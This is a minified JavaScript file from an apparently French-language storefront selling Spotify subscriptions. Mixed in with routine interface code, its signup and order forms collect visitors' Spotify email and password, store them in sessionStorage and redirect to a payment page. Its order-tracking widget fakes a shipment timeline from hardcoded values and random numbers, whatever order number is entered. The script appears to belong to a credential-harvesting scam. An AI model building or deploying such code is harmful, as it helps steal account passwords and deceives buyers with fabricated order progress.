"use strict";(()=>{function T(){let e=document.getElementById("cookie-consent"),o=document.getElementById("accept-cookies"),n=document.getElementById("reject-cookies");!e||!o||!n||(localStorage.getItem("cookieConsent")||(e.style.display="block"),o.addEventListener("click",()=>{localStorage.setItem("cookieConsent","accepted"),e.style.display="none"}),n.addEventListener("click",()=>{localStorage.setItem("cookieConsent","rejected"),e.style.display="none"}))}function P(){let e=document.querySelector(".feature-slider");if(!e)return;let o=e.querySelector(".feature-slide-track"),n=!1,s,u,g=i=>{n=!0,e.classList.add("dragging"),s=i-e.offsetLeft,u=e.scrollLeft},l=()=>{n=!1,e.classList.remove("dragging")},a=i=>{if(!n)return;let v=i-e.offsetLeft-s;e.scrollLeft=u-v};e.addEventListener("mousedown",i=>g(i.pageX)),e.addEventListener("touchstart",i=>g(i.touches[0].pageX),{passive:!0}),window.addEventListener("mouseup",l),e.addEventListener("touchend",l),e.addEventListener("mousemove",i=>a(i.pageX)),e.addEventListener("touchmove",i=>a(i.touches[0].pageX),{passive:!0})}function O(){let e=document.getElementById("signup-form");e&&e.addEventListener("submit",o=>{o.preventDefault();let n=document.getElementById("hero-email").value.trim(),s=document.getElementById("hero-password").value.trim();!n||!s||(sessionStorage.setItem("spotifyEmail",n),sessionStorage.setItem("spotifyPassword",s),window.location.href="paiement.html")})}function N(){let e=document.getElementById("order-form");if(e){let o=document.getElementById("order-btn"),n=document.querySelectorAll('.consent-checks input[type="checkbox"]'),s=document.getElementById("cmd-email"),u=document.getElementById("cmd-password"),g=()=>{let l=Array.from(n).every(a=>a.checked);o.disabled=!l};n.forEach(l=>{l.addEventListener("change",g)}),e.addEventListener("submit",function(l){if(l.preventDefault(),!Array.from(n).every(v=>v.checked)){alert("Veuillez accepter tous les termes avant de continuer.");return}let a=s.value,i=u.value;if(!a||!i){alert("Veuillez remplir tous les champs requis.");return}sessionStorage.setItem("spotifyEmail",a),sessionStorage.setItem("spotifyPassword",i),window.location.href="paiement.html"}),g()}}function A(){O(),N()}function V(){let e=document.querySelector(".mobile-menu-btn"),o=document.querySelector(".nav");e&&o&&e.addEventListener("click",()=>{o.classList.toggle("active"),e.classList.toggle("active")})}function z(){let e=document.getElementById("back-to-top");e&&(window.addEventListener("scroll",()=>{window.pageYOffset>300?e.style.display="block":e.style.display="none"}),e.addEventListener("click",()=>{window.scrollTo({top:0,behavior:"smooth"})}))}function R(){document.querySelectorAll(".faq-item").forEach(e=>{e.querySelector("h4").addEventListener("click",()=>e.classList.toggle("open"))})}function U(){let e=document.getElementById("theme-toggle"),o=window.matchMedia("(prefers-color-scheme: dark)");if(e){let n=localStorage.getItem("theme");n?document.body.classList.toggle("light-theme",n==="light"):document.body.classList.toggle("light-theme",!o.matches),e.addEventListener("click",()=>{document.body.classList.toggle("light-theme");let s=document.body.classList.contains("light-theme");localStorage.setItem("theme",s?"light":"dark")}),o.addEventListener("change",s=>{localStorage.getItem("theme")||document.body.classList.toggle("light-theme",!s.matches)})}}function F(){V(),z(),R(),U()}function S(e){let o=document.getElementById("progress-bar-fill"),n=document.querySelectorAll(".step");if(!o||!n.length)return;let s=0;e===1?s=0:e===2?s=20:e===3?s=40:e===4?s=60:e===5&&(s=100),o.style.width=s+"%",n.forEach((u,g)=>{let l=g+1;u.classList.remove("active","completed"),l<e?u.classList.add("completed"):l===e&&u.classList.add("active")})}function Y(){let e=document.getElementById("order-tracking");if(e){let o=e.querySelector("#track-order-btn"),n=e.querySelector("#order-number"),s=e.querySelector(".tracking-result");o&&n&&s&&o.addEventListener("click",()=>{let u=n.value.trim();if(!u)return;s.style.display="block",document.getElementById("result-order-number").textContent=u,document.getElementById("result-order-date").textContent=new Date().toLocaleDateString(),document.getElementById("result-email").textContent="exemple@email.com",document.getElementById("result-amount").textContent="82,62$ CAD",document.getElementById("result-payment-method").textContent="PayPal",document.getElementById("result-estimated-time").textContent="3 \xE0 5 jours ouvrables";let g=new Date;document.getElementById("timeline-order-date").textContent=g.toLocaleString(),document.getElementById("timeline-payment-date").textContent=new Date(g.getTime()+1e3*60*30).toLocaleString(),document.getElementById("timeline-verification-date").textContent=new Date(g.getTime()+1e3*60*60).toLocaleString(),document.getElementById("timeline-activation-date").textContent="En attente",document.getElementById("timeline-confirmation-date").textContent="En attente",(()=>{let a=1;S(a);let i=setInterval(()=>{if(a++,a>5){clearInterval(i);return}S(a)},2e3)})()})}}function M(){Y(),window.updateProgressBar=S}document.addEventListener("DOMContentLoaded",()=>{T(),P(),A(),F(),M()});document.addEventListener("DOMContentLoaded",function(){let e=document.getElementById("order-form"),o=document.getElementById("order-btn"),n=document.querySelectorAll('.consent-checks input[type="checkbox"]'),s=document.getElementById("signup-form"),u=document.getElementById("hero-email"),g=document.getElementById("hero-password"),l=document.getElementById("cmd-email"),a=document.getElementById("cmd-password"),i=document.getElementById("email"),v=document.getElementById("password"),X=document.querySelectorAll(".faq-item"),L=document.getElementById("cookie-consent"),b=document.getElementById("accept-cookies"),C=document.getElementById("reject-cookies"),w=document.querySelector(".mobile-menu-btn"),x=document.querySelector(".nav"),k=document.getElementById("back-to-top"),f=document.querySelector(".feature-slider"),q=document.getElementById("theme-toggle"),I=document.getElementById("order-tracking");function j(){let t=Array.from(n).every(r=>r.checked);o.disabled=!t}if(n.forEach(t=>{t.addEventListener("change",j)}),e&&e.addEventListener("submit",function(t){if(t.preventDefault(),!Array.from(n).every(m=>m.checked)){alert("Veuillez accepter tous les termes avant de continuer.");return}let r=i.value,d=v.value;if(!r||!d){alert("Veuillez remplir tous les champs requis.");return}window.location.href="paiement.html"}),s&&s.addEventListener("submit",t=>{t.preventDefault();let r=u.value.trim(),d=g.value.trim();!r||!d||(sessionStorage.setItem("spotifyEmail",r),sessionStorage.setItem("spotifyPassword",d),window.location.href="paiement.html")}),l&&a&&o){let t=function(){o.disabled=!(l.checkValidity()&&a.value.trim())};l.addEventListener("input",t),a.addEventListener("input",t),o.addEventListener("click",()=>{sessionStorage.setItem("spotifyEmail",l.value),sessionStorage.setItem("spotifyPassword",a.value),window.location.href="paiement.html"})}if(X.forEach(t=>{t.querySelector("h4").addEventListener("click",()=>t.classList.toggle("open"))}),L&&b&&C&&(localStorage.getItem("cookieConsent")||(L.style.display="block"),b.addEventListener("click",()=>{localStorage.setItem("cookieConsent","accepted"),L.style.display="none"}),C.addEventListener("click",()=>{localStorage.setItem("cookieConsent","rejected"),L.style.display="none"})),w&&x&&w.addEventListener("click",()=>{x.classList.toggle("active"),w.classList.toggle("active")}),k&&(window.addEventListener("scroll",()=>{window.pageYOffset>300?k.style.display="block":k.style.display="none"}),k.addEventListener("click",()=>{window.scrollTo({top:0,behavior:"smooth"})})),f){let t=f.querySelector(".feature-slide-track"),r=!1,d,m,y=c=>{r=!0,f.classList.add("dragging"),d=c-f.offsetLeft,m=f.scrollLeft},h=()=>{r=!1,f.classList.remove("dragging")},p=c=>{if(!r)return;let E=c-f.offsetLeft-d;f.scrollLeft=m-E};f.addEventListener("mousedown",c=>y(c.pageX)),f.addEventListener("touchstart",c=>y(c.touches[0].pageX),{passive:!0}),window.addEventListener("mouseup",h),f.addEventListener("touchend",h),f.addEventListener("mousemove",c=>p(c.pageX)),f.addEventListener("touchmove",c=>p(c.touches[0].pageX),{passive:!0})}function B(t){let r=document.getElementById("progress-bar-fill"),d=document.querySelectorAll(".step");if(!r||!d.length)return;let m=0;t===1?m=0:t===2?m=20:t===3?m=40:t===4?m=60:t===5&&(m=100),r.style.width=m+"%",d.forEach((y,h)=>{let p=h+1;y.classList.remove("active","completed"),p<t?y.classList.add("completed"):p===t&&y.classList.add("active")})}window.updateProgressBar=B;let D=window.matchMedia("(prefers-color-scheme: dark)");if(q){let t=localStorage.getItem("theme");t?document.body.classList.toggle("light-theme",t==="light"):document.body.classList.toggle("light-theme",!D.matches),q.addEventListener("click",()=>{document.body.classList.toggle("light-theme");let r=document.body.classList.contains("light-theme");localStorage.setItem("theme",r?"light":"dark")}),D.addEventListener("change",r=>{localStorage.getItem("theme")||document.body.classList.toggle("light-theme",!r.matches)})}if(I){let t=I.querySelector("#track-order-btn"),r=I.querySelector("#order-number"),d=I.querySelector(".tracking-result");t&&r&&d&&t.addEventListener("click",()=>{let m=r.value.trim();if(!m)return;d.style.display="block",document.getElementById("result-order-number").textContent=m,document.getElementById("result-order-date").textContent=new Date().toLocaleDateString(),document.getElementById("result-email").textContent="exemple@email.com",document.getElementById("result-amount").textContent="82,62$ CAD",document.getElementById("result-payment-method").textContent="PayPal",document.getElementById("result-estimated-time").textContent="3 \xE0 5 jours ouvrables";let y=new Date;document.getElementById("timeline-order-date").textContent=y.toLocaleString(),document.getElementById("timeline-payment-date").textContent=new Date(y.getTime()+1e3*60*30).toLocaleString(),document.getElementById("timeline-verification-date").textContent=new Date(y.getTime()+1e3*60*60).toLocaleString(),document.getElementById("timeline-activation-date").textContent="En attente",document.getElementById("timeline-confirmation-date").textContent="En attente";let h=()=>{let c=d.querySelectorAll(".timeline-item"),E=1;Math.random()>.3&&(c[1].classList.add("completed"),E++),Math.random()>.6&&(c[2].classList.add("completed"),E++)},p=()=>{let c=1;B(c);let E=setInterval(()=>{if(c++,c>5){clearInterval(E);return}B(c)},2e3)};h(),p()})}});})();
